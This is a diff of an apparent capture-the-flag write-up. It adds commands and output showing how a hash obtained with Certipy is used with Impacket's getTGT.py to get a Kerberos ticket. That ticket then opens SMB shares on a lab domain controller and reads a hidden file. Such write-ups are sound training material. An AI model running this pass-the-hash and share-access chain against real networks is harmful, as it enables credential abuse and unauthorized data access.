@@ -246,11 +246,47 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved credential cache to 'wombleycube.ccache'
 [*] Trying to retrieve NT hash for 'wombleycube'
 [*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+alabaster@ssh-server-vm:~/impacket$ ./getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53 northpole.local/wombleycube
 
+alabaster@ssh-server-vm:~/impacket$ ./smbclient.py -k -dc-ip 10.0.0.53 -target-ip 10.0.0.53 northpole.local/wombleycube@npdc01
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+Type help for list of commands
+# shares
+ADMIN$
+C$
+D$
+FileShare
+IPC$
+NETLOGON
+SYSVOL
+# use FileShare
+# ls
+drw-rw-rw-          0  Mon Dec 11 01:14:38 2023 .
+drw-rw-rw-          0  Mon Dec 11 01:14:35 2023 ..
+-rw-rw-rw-     701028  Mon Dec 11 01:14:38 2023 Cookies.pdf
+-rw-rw-rw-    1521650  Mon Dec 11 01:14:38 2023 Cookies_Recipe.pdf
+-rw-rw-rw-      54096  Mon Dec 11 01:14:38 2023 SignatureCookies.pdf
+drw-rw-rw-          0  Mon Dec 11 01:14:38 2023 super_secret_research
+-rw-rw-rw-        165  Mon Dec 11 01:14:38 2023 todo.txt
+# cd super_secret_research
+# ls
+drw-rw-rw-          0  Mon Dec 11 01:14:38 2023 .
+drw-rw-rw-          0  Mon Dec 11 01:14:38 2023 ..
+-rw-rw-rw-        231  Mon Dec 11 01:14:38 2023 InstructionsForEnteringSatelliteGroundStation.txt
+# cat InstructionsForEnteringSatelliteGroundStation.txt
+Note to self:
+
+To enter the Satellite Ground Station (SGS), say the following into the speaker:
+
+And he whispered, 'Now I shall be out of sight;
+So through the valley and over the height.'
+And he'll silently take his way.
 ```
 
-**Achievement: Ipsum**
+**Achievement: AD**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbOTMxODkwMTk2LDEwODc4NTMxNDcsLTIwMT
-AxOTI2M119
+eyJoaXN0b3J5IjpbMTE2NDMzMzE3MCwxMDg3ODUzMTQ3LC0yMD
+EwMTkyNjNdfQ==
 -->
